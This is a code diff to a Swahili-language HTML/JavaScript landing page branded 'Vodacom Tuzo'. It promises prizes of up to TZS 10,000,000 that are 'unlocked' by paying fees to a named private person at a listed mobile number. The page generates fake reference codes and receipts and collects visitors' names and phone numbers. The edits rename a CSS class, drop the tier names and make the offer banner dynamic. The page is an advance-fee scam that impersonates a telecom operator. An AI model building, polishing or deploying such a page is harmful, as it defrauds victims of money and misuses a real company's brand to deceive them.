@@ -157,7 +157,7 @@
   .logo .vodacom {
     color: var(--vodacom-red);
   }
-  .logo .tunzo {
+  .logo .tuzo {
     color: var(--gold);
   }
   .nav-links {
@@ -260,7 +260,7 @@
   .landing-header h1 .vodacom {
     color: var(--vodacom-red);
   }
-  .landing-header h1 .tunzo {
+  .landing-header h1 .tuzo {
     color: var(--gold);
   }
   .landing-header h1 em {
@@ -1085,7 +1085,7 @@
     <div class="wrap nav">
       <div class="logo">
         <span class="vodacom">Vodacom</span>
-        <span class="tunzo">Tuzo</span>
+        <span class="tuzo">Tuzo</span>
       </div>
       <ul class="nav-links">
         <li><a href="#jinsi">Jinsi</a></li>
@@ -1155,7 +1155,7 @@
             <div class="unlock-fee">
               <span class="currency">TZS</span> 43,569
             </div>
-            <button class="btn-unlock" onclick="openModal('300,000', '43,569', 'Fedha')">
+            <button class="btn-unlock" onclick="openModal('300,000', '43,569')">
               🔓 Fungua Sasa
             </button>
           </div>
@@ -1172,7 +1172,7 @@
             <div class="unlock-fee">
               <span class="currency">TZS</span> 101,203
             </div>
-            <button class="btn-unlock" onclick="openModal('600,000', '101,203', 'Dhahabu')">
+            <button class="btn-unlock" onclick="openModal('600,000', '101,203')">
               🔓 Fungua Sasa
             </button>
           </div>
@@ -1190,7 +1190,7 @@
             <div class="unlock-fee">
               <span class="currency">TZS</span> 297,456
             </div>
-            <button class="btn-unlock" onclick="openModal('1,200,000', '297,456', 'Almasi')">
+            <button class="btn-unlock" onclick="openModal('1,200,000', '297,456')">
               🔓 Fungua Sasa
             </button>
           </div>
@@ -1207,7 +1207,7 @@
             <div class="unlock-fee">
               <span class="currency">TZS</span> 556,489
             </div>
-            <button class="btn-unlock" onclick="openModal('2,500,000', '556,489', 'Taji')">
+            <button class="btn-unlock" onclick="openModal('2,500,000', '556,489')">
               🔓 Fungua Sasa
             </button>
           </div>
@@ -1224,7 +1224,7 @@
             <div class="unlock-fee">
               <span class="currency">TZS</span> 1,112,978
             </div>
-            <button class="btn-unlock" onclick="openModal('5,000,000', '1,112,978', 'Kifalme')">
+            <button class="btn-unlock" onclick="openModal('5,000,000', '1,112,978')">
               🔓 Fungua Sasa
             </button>
           </div>
@@ -1242,7 +1242,7 @@
             <div class="unlock-fee">
               <span class="currency">TZS</span> 2,225,956
             </div>
-            <button class="btn-unlock" onclick="openModal('10,000,000', '2,225,956', 'Jackpot')">
+            <button class="btn-unlock" onclick="openModal('10,000,000', '2,225,956')">
               🔓 Fungua Sasa
             </button>
           </div>
@@ -1440,10 +1440,10 @@
 
       <div class="form-view" id="formView">
 
-        <!-- ===== OFFER TEXT ===== -->
-        <div class="modal-offer-banner">
+        <!-- ===== OFFER TEXT (DYNAMIC) ===== -->
+        <div class="modal-offer-banner" id="offerBanner">
           <span class="icon">⚡</span>
-          <span class="text">
+          <span class="text" id="offerText">
             <strong>Pata ofa ya Tsh 300,000</strong> ... Kwa kulipa ada ya uwezeshaji ya Kwa nambari ya katibu <span class="highlight">Joseph Samwel</span> <span class="number">0791 045 431</span>
           </span>
         </div>
@@ -1492,9 +1492,9 @@
         <p style="color:#5B5646;font-size:13.5px;">Zawadi yako inatumwa sasa kwenye simu yako.</p>
         <div class="receipt">
           <div class="row"><span>Jina</span><b id="rcptName">—</b></div>
-          <div class="row"><span>Zawadi</span><b id="rcptTier">Fedha</b></div>
-          <div class="row"><span>Kiasi</span><b id="rcptAmount">TZS 300,000</b></div>
-          <div class="row"><span>Umelipa</span><b id="rcptPaid">TZS 43,569</b></div>
+          <div class="row"><span>Zawadi</span><b id="rcptTier">—</b></div>
+          <div class="row"><span>Kiasi</span><b id="rcptAmount">—</b></div>
+          <div class="row"><span>Umelipa</span><b id="rcptPaid">—</b></div>
           <div class="row"><span>Namba yako</span><b id="rcptPhone">—</b></div>
           <div class="row"><span>Kitambulisho</span><b id="rcptId">—</b></div>
         </div>
@@ -1526,20 +1526,25 @@
     // ---- Payment modal ----
     const PAYMENT_NUMBER = "0791 045 431";
     const PAYMENT_NAME = "Joseph Samwel";
-    let currentPrize = { name: '', amount: '', fee: '' };
+    let currentPrize = { amount: '', fee: '' };
     let currentRef = '';
 
     function generateRef() {
       return 'VT-' + Math.floor(10000 + Math.random() * 89999);
     }
 
-    function openModal(prizeAmount, unlockFee, prizeName) {
+    function openModal(prizeAmount, unlockFee) {
       currentPrize = {
-        name: prizeName,
         amount: prizeAmount,
         fee: unlockFee
       };
       currentRef = generateRef();
+
+      // Update the offer text dynamically
+      const offerText = document.getElementById('offerText');
+      offerText.innerHTML = `
+        <strong>Pata ofa ya Tsh ${prizeAmount}</strong> ... Kwa kulipa ada ya uwezeshaji ya Kwa nambari ya katibu <span class="highlight">Joseph Samwel</span> <span class="number">0791 045 431</span>
+      `;
 
       // Update payment details
       document.getElementById('payAmount').textContent = 'TZS ' + unlockFee;
@@ -1547,7 +1552,7 @@
       document.getElementById('refCode').textContent = currentRef;
 
       // Update receipt for success view
-      document.getElementById('rcptTier').textContent = prizeName;
+      document.getElementById('rcptTier').textContent = 'Zawadi';
       document.getElementById('rcptAmount').textContent = 'TZS ' + prizeAmount;
       document.getElementById('rcptPaid').textContent = 'TZS ' + unlockFee;
 
@@ -1622,8 +1627,7 @@
       const record = {
         id: memberId,
         name: nameInput.value.trim(),
-        prize: currentPrize.name,
-        amount: currentPrize.amount,
+        prize: currentPrize.amount,
         fee: currentPrize.fee,
         phone: phoneInput.value.trim(),
         ref: currentRef,
